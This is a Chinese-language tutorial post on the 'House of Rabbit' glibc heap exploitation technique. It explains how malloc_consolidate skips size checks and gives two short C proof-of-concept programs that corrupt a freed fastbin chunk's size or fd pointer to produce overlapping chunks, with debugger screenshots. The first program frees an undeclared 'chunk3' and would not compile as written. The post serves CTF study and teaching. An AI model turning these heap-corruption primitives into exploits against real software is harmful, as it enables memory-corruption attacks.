# House of Rabbit

## 介绍：

1. House of rabbit 是一种伪造堆块的技术，早在 2017 年已经提出，但在最近两个月才在 CTF 比赛中出现。我们一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。

## 原理：

1. 我们知道，fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会**检查 size 是否合理**，如果不合理程序就会异常退出。而 house of rabbit 就利用了**在 malloc consolidate 的时候 fastbin 中的堆块进行合并**时 **size 没有进行检查**从而伪造一个假的堆块，为进一步的利用做准备。
2. 利用条件：
   * 可以**修改 fastbin 的 fd 指针或 size**  
   * 可以**触发 malloc consolidate**(merge top 或 malloc big chunk 等等)

```c
  if (in_smallbin_range(nb))
  {
    idx = smallbin_index(nb);
    bin = bin_at(av, idx);

    if ((victim = last(bin)) != bin)
    {
      if (victim == 0) /* initialization check */
        malloc_consolidate(av);
      else
      {
        bck = victim->bk;
        if (__glibc_unlikely(bck->fd != victim))
        {
          errstr = "malloc(): smallbin double linked list corrupted";
          goto errout;
        }
        set_inuse_bit_at_offset(victim, nb);
        bin->bk = bck;
        bck->fd = bin;

        if (av != &main_arena)
          victim->size |= NON_MAIN_ARENA;
        check_malloced_chunk(av, victim, nb);
        void *p = chunk2mem(victim);
        alloc_perturb(p, bytes);
        return p;
      }
    }
  }

  /*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */

  else//分配的chunk大小超过small bin时(即分配一个large bin)，会先调用malloc_consolidate，整理fastbin中的
  {
    idx = largebin_index(nb);
    if (have_fastchunks(av))
      malloc_consolidate(av);
  }
```





## POC1: 

1. modify the size of fastbin chunk:

   ```c
   #include <stdlib.h>
   #include <stdio.h>
   #include <string.h>
   int main(void)
   {
       unsigned long* chunk1=malloc(0x40); //0x602000
       unsigned long* chunk2=malloc(0x40); //0x602050
       malloc(0x10);
       free(chunk1);
       free(chunk3);
   
       chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1
       malloc(0x400);  //allocate a large chunk, trigger malloc_consolidate
       malloc(0x90); //申请到修改size后的chunk，并造成overlapping
       return 0;
   }
   
   ```

   调试分析：先释放掉两个chunk

   ![image-20240809154606416](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408091546003.png)

   修改chunk1的size字段：

   ![image-20240809154816163](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408091548667.png)

   再分配一个较大的size，**触发maloc_consolidate函数** （没有堆size进行检查），**将fastbin整理到small bin中**，将其直接放入到small bin中，后面申请chunk时就会造成overlapping：

   ![image-20240809154945736](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408091549348.png)

## POC2

1. modify FD pointer:

   ```c
   #include <stdlib.h>
   #include <stdio.h>
   #include <string.h>
   int main(void)
   {
       unsigned long* chunk1=malloc(0x40); //0x602000
       unsigned long* chunk2=malloc(0x100);//0x602050
       chunk2[1]=0x31; //fake chunk size 0x30
       chunk2[7]=0x21;  //fake chunk's next chunk
       chunk2[11]=0x21;//fake chunk's next chunk's next chuck
       free(chunk1);
       chunk1[0]=0x405050;// modify the fd of chunk1
       malloc(0x400);// malloc a  big chunk to trigger malloc consolidate
       return 0;	
   }
   
   ```

2. 调试，修改前的堆：

   ![image-20240809164501958](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408091645530.png)

   伪造fake_chunk，这里为什么size字段填1，可以看这篇文章[伪造unsortedbin释放时 top chunk的衔接问题](https://blog.csdn.net/yjh_fnu_ltn/article/details/140830566?spm=1001.2014.3001.5501)：这里甚至可以将fake_chunk_next的size字段给为0x11：

   ![image-20240809170745070](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408101026605.png)

   faka_chunk_next的size字段给为0x11仍然可以通过检查：

   ![image-20240809171029205](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408091710717.png)

   

   再分配一个较大的size，**触发maloc_consolidate函数** （没有堆size进行检查），**将fastbin整理到small bin中**，将其直接放入到small bin中，后面申请chunk时就会造成overlapping：

   ![image-20240809170500710](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202408091705135.png)

## 总结

House of rabbit 的优点是**容易构造 overlap chunk** ，由于可以基于 fastbin attack，甚至不需要 leak 就可以完成攻击。